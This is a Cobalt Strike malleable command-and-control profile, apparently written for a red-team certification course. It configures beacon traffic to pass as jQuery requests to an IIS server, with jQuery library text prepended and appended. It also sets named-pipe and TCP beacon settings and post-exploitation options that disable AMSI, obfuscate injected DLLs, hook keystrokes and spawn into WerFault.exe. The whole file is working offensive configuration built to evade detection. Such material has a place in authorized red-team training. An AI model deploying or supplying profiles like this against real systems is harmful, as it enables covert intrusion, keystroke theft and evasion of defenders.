


```powershell
# Custom C2 Profile for CRTO
set sample_name "Dumbledore";
set sleeptime "6000";
set jitter    "73";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "false";
set tasks_max_size "2097152";


#SMB BEACONS
set pipename         "Winsock25\\CatalogChangeListener-###-0";
set pipename_stager "crashpad_69_69";
set smb_frame_header "\xff\x53\x4d\x42\x2f\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x40\x6d\x4e\xf4\x8c\x6e\x13\x7b\x00\x00\x00\x08\xff\xfe\x00\x08\x00\x01"; 

#TCP BEACON
set tcp_port "42125";
set tcp_frame_header "\x34\xe2\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\xff\xff\x7a\xcb\x00\x00";


set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename      "wkssvc##";

set host_stage "false";


post-ex {
    # Optionally specify non-existent filepath to force manual specification based on the Beacon host's running processes

    # If you get file not found errors then change your spawnto's
    set spawnto_x64 "%windir%\\windows32\\WerFault.exe";
    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
    set cleanup "true";
    # Modify our post-ex pipe names
    set pipename     "Winsock2\\CatalogChangeListener-999-0,";
    set keylogger    "SetWindowsHookEx";
    set thread_hint  "ntdll!RtlUserThreadStart";

    transform-x64 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }

    transform-x86 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }
}
set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS



http-get {


    set uri "/jquery/user/preferences"; # URI used for GET requests
    set verb "GET";


    client {

        header "Accept" "image/*, application/json, text/html";
        header "Accept-Language" "nb";
        header "Accept-Encoding" "br, compress";
        header "Access-X-Control" "True";


        metadata {

            mask; # Transform type
            base64url; # Transform type
            prepend "SESSIONID_XVQD0C55VSGX3JM="; # Cookie value
            header "Cookie";                      # Cookie header

        }

    }


    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";

            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            print;
        }
    }
}


http-post {

    set uri "/api/v2/jquery/settings/update"; # URI used for POST block.
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST


    client {

        header "Accept" "application/xml, application/xhtml+xml, application/json";
        header "Accept-Language" "tn";
        header "Accept-Encoding" "identity, *";
        header "Access-X-Control" "True";


        id {

            mask; # Transform type
            netbiosu; # Transform type
            parameter "_KZZUEUVN";

        }


        output {

            mask; # Transform type
            netbios; # Transform type
            print;

        }

    }


    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";


        output {

            mask; # Transform type

            netbiosu; # Transform type

            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";

            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";

            print;


        }

    }

}

```
